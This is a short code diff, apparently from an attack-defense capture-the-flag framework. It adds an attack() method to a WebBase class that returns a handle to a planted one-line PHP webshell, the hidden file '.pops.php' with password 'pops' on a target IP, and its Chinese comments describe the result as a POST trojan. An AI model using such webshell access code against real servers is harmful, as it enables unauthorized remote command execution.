@@ -1,3 +1,4 @@
+from webshell.shell3 import Shell3
 class WebBase():
     '''
     攻击类需要实现attack(ip:str)->tuple:
@@ -8,4 +9,4 @@ class WebBase():
     attack(ip):webshell,flag
     '''
     def attack(self,ip:str)->tuple:
-        pass
+        return (Shell3('http://{}/.pops.php'.format(ip),'POST','pops'),'')  #攻击结束，返回一个post一句话木马
